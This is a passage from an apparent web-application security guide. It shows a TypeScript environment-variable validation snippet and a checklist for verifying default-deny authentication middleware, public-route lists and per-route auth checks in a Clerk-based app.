  // Format validation for specific vars
  if (!process.env.DATABASE_URL!.startsWith("postgres")) {
    console.error("FATAL: DATABASE_URL must be a PostgreSQL connection string");
    process.exit(1);
  }

  if (!process.env.CLERK_SECRET_KEY!.startsWith("sk_")) {
    console.error("FATAL: CLERK_SECRET_KEY must start with 'sk_'");
    process.exit(1);
  }

  // ... return validated vars ...
}
```

## Verification

- Review the middleware configuration and confirm it follows a default-deny pattern — all routes require auth unless explicitly listed in PUBLIC_ROUTES
- Search for wildcard patterns (`(.*)`, `*`, `:path*`, `startsWith`) in public route lists — remove any that exist and replace with explicit routes
- Verify that every API route handler checks authentication independently, not just relying on middleware
- Remove or unset a required environment variable and start the application — confirm it crashes immediately with a clear error message
- Run the route audit script and verify that no unexpected routes are public
- Test each public route to confirm it should genuinely be public — review every entry in PUBLIC_ROUTES
- Test an API key request against a Clerk-protected route and verify it is handled correctly (accepted by the correct auth method, not rejected or silently bypassed)
- Add a new `route.ts` file in the `api/` directory and verify it is protected by default without any middleware changes
- Check that the auth strategy matrix comment/documentation matches the actual middleware implementation

---

---

── Page 39 ──

# Enhancements to Existing Chapters

---
